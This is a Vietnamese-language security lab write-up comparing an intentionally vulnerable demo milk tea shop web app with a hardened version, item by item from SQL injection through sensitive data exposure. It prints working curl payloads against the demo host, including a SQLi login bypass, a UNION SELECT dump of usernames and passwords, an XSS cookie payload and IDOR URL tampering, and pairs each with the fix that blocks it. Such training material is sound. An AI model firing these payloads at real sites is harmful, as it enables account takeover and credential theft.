# So sánh Tấn công & Bảo vệ — Milk Tea Shop

| Domain | URL | Container |
|--------|-----|-----------|
| Vulnerable | https://demo-milktea.zoskisk.com | milktea-app |
| Secured | https://secured-milktea.zoskisk.com | milktea-secured |

---

## A1 — SQL Injection

| | Vulnerable | Secured |
|--|-----------|---------|
| **Điểm tấn công** | `/login`, `/user/search`, `/vuln/sqli` | — |
| **Attack** | `' OR '1'='1`, `admin'--` | — |
| **Kết quả** | Dump users, login bypass | — |
| **Fix** | — | Parameterized queries everywhere |
| **Attack works?** | ✅ | ❌ |

**Payload thử:**
```bash
# Vulnerable: SQLi bypass
curl -d "username=admin'--&password=anything" https://demo-milktea.zoskisk.com/login

# Secured: Blocked
curl -d "username=admin'--&password=anything" https://secured-milktea.zoskisk.com/login
# → "Invalid credentials" (parameterized query escape)
```

---

## A2 — Broken Authentication

| | Vulnerable | Secured |
|--|-----------|---------|
| **Session Secret** | `devsecret` (hardcoded) | `crypto.randomBytes(64)` |
| **Password Storage** | Plaintext | bcrypt hash |
| **Forgot Password** | Token = `base64(username)` | Disabled |
| **User Enumeration** | Có ("Username not found") | Không (luôn "email sent") |
| **Brute Force** | Không chặn | bcrypt làm chậm ~1M lần |

**So sánh password hash:**
```
Vulnerable:  admin123 (plaintext)
Secured:    $2a$10$N9qo8uLOickgx2ZMRZoHK.bn4pTqlHKbE9x5R9z3FxJaXj8Z2JYKq
```

---

## A3 — Cross-Site Scripting (XSS)

| | Vulnerable | Secured |
|--|-----------|---------|
| **Điểm tấn công** | `/vuln/xss` → `/user/reviews` | — |
| **Payload** | `<script>alert(document.cookie)</script>` | — |
| **Render** | `<%- r.comment %>` (raw HTML) | `<%= r.comment %>` (escaped) |
| **Fix** | — | Output encoding + parameterized INSERT |
| **Attack works?** | ✅ | ❌ |

---

## A4 — IDOR (Insecure Direct Object Reference)

| | Vulnerable | Secured |
|--|-----------|---------|
| **Điểm tấn công** | `/user/order/:id` | — |
| **Attack** | Thay đổi ID trong URL | — |
| **Kết quả** | Xem order của user khác | — |
| **Fix** | — | Ownership check + admin bypass |
| **Attack works?** | ✅ | ❌ |

**Payload thử:**
```
Vulnerable: https://demo-milktea.zoskisk.com/user/order/1
           → Xem order của admin (IDOR)

Secured:    https://secured-milktea.zoskisk.com/user/order/1
           → 403 Forbidden hoặc redirect login
```

---

## A5 — Security Misconfiguration

| | Vulnerable | Secured |
|--|-----------|---------|
| **Debug endpoint** | `/debug` (lộ session_secret) | Removed |
| **Config endpoint** | `/vuln/config` (lộ app_config) | Removed |
| **Security headers** | Không có | X-Frame-Options, CSP, HSTS... |
| **app_config table** | Có (lộ secrets) | Removed |

**Debug endpoint:**
```bash
# Vulnerable - lộ thông tin nhạy cảm
curl https://demo-milktea.zoskisk.com/debug
# {"session_secret":"devsecret","db_path":"/app/data.db"...}

# Secured - endpoint không tồn tại
curl https://secured-milktea.zoskisk.com/debug
# 404 Not Found
```

---

## A6 — Sensitive Data Exposure

| | Vulnerable | Secured |
|--|-----------|---------|
| **API /api/users** | Không auth, lộ password | Removed |
| **API /api/profile** | Lộ password trong JSON | Removed |
| **/vuln/data** | Lộ plaintext passwords | Removed |

**Payload thử:**
```bash
# Vulnerable - dump all users
curl https://demo-milktea.zoskisk.com/api/users
# [{"id":1,"username":"admin","password":"admin123","role":"admin"}...]

# Secured - endpoint không tồn tại
curl https://secured-milktea.zoskisk.com/api/users
# 404 Not Found
```

---

## Bảng Tổng hợp

| Lỗ hổng | Tấn công | Demo | Secured | Status |
|----------|----------|------|---------|--------|
| A1 SQL Injection | `admin'--` bypass | ✅ Có | ✅ Fixed | ✅ |
| A1 SQL Injection | `UNION SELECT` dump | ✅ Có | ✅ Fixed | ✅ |
| A2 Plaintext password | Dump DB | ✅ Có | ✅ Fixed | ✅ |
| A2 Weak session | Predict secret | ⚠️ Khó* | ✅ Fixed | ✅ |
| A2 Token predictable | `base64(admin)` | ✅ Có | ✅ Fixed | ✅ |
| A3 XSS | `<script>` | ✅ Có | ✅ Fixed | ✅ |
| A4 IDOR | Change order ID | ✅ Có | ✅ Fixed | ✅ |
| A5 Debug endpoint | `/debug` | ✅ Có | ✅ Fixed | ✅ |
| A5 Config | `/vuln/config` | ✅ Có | ✅ Fixed | ✅ |
| A6 API exposed | `/api/users` | ✅ Có | ✅ Fixed | ✅ |

*Ghi chú: Cookie forgery với keygrip phức tạp hơn simple HMAC forgery

---

## Defense in Depth

```
Layer 1: Cloudflare (DDoS protection, Bot protection)
Layer 2: Traefik (Routing, TLS)
Layer 3: App-level fixes (Parameterized queries, bcrypt, headers)
Layer 4: Secured code (No /vuln/*, No /debug, No /api/*)
```

Mỗi layer bảo vệ thêm một lớp — nếu layer ngoài bị bypass, layer trong vẫn bảo vệ.

---

## Test Commands

```bash
# Login bypass (SQLi)
curl -d "username=admin'--&password=x" https://demo-milktea.zoskisk.com/login

# Dump users via SQLi
curl -d "q=' UNION SELECT id,username,password,role,email,balance FROM users--" \
     https://demo-milktea.zoskisk.com/user/search

# IDOR - view other user's order
curl -b cookies.txt https://demo-milktea.zoskisk.com/user/order/2

# Debug endpoint
curl https://demo-milktea.zoskisk.com/debug

# API users (no auth)
curl https://demo-milktea.zoskisk.com/api/users
```

